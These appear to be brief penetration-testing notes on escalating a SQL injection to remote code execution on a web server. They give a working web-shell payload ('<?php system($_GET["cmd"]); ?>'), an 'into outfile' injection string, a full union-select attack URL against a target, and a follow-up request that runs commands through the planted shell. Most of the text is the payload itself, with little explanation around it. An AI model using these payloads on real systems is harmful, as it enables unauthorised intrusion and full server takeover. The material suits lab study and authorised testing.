# Sql Injectoin to RCE

We detect the sqli vulnerability on target, we get password hash but we cant crack it, so what next ? 

here we can try RCE from sqli injeciton. For this We need to determine the root directory of the web server to upload our shell. Depending on the application and the type of web server in use, this can vary, especially if an admin changes the default location or adequate permissions are in place.Information about the web server, including the root directory, can usually be found in the "phpinfo.php" file. For this notes we can assume `/var/www/html` 

We use `into outfile` cmd to write file on server.with simple `php` script

```php
<?php system($_GET["cmd"]); ?>
```

```php
'<?php system($_GET["cmd"]); ?>' into outfile '/var/www/dvwa/cmd.php' #
```

Example

```html
http://target.com/product?id=2' union select 1,2,'<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/shell.php' #
```

We can execute cmd by going `http://target.com/shell.php?cmd=whoami`
